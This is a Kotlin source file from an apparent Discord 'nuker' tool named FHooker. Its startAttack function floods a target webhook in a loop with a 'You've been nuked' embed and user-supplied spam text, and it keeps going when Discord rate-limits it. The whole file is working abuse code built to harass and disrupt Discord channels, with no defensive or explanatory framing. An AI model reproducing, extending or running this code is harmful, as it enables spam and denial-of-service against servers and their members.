package idk.bluecross.fhooker.logic

import idk.bluecross.fhooker.Globals
import idk.bluecross.fhooker.util.log
import idk.bluecross.fhooker.util.showError
import java.awt.Color
import kotlin.concurrent.thread

var timerThr: Thread? = null // don't understand kotlin coroutines so I'll use threads


fun startAttack() {
    Globals.attackingRn = true
    val discord = DiscordApi(Globals.webhook)

    timerThr = thread(start = true) {
        try {
            val discord = discord
            val text = Globals.spamText
            var stuckIndicator = 0
            discord.clearEmbeds()
            discord.addEmbed(
                DiscordApi.EmbedObject()
                    .setTitle("You've been nuked :3")
                    .setDescription("FHooker by Bluecross")
                    .setColor(Color.RED)
            )
            discord.setContent(text)
            var i = 0
            while (timerThr != null && Globals.attackingRn && !timerThr!!.isInterrupted && timerThr!!.isAlive) {
                i++
                if (Globals.speedIsRestricted) {
                    showError(true, "Discord restricted our spam messages :( Wait...")
                } else (showError(false, ""))
                discord.execute()
                log("tried to send at ${Globals.webhook} $i times")
                Thread.sleep(Globals.spamDelay.toLong())
            }
        } catch (e: Exception) {
            if (e.message.toString().equals("sleep interrupted")) {
                // do nothing lel
            } else {
                e.printStackTrace()
            }
        }
    }
}

fun stopAttack() {
    Globals.attackingRn = false
    timerThr?.interrupt()
    timerThr = null
}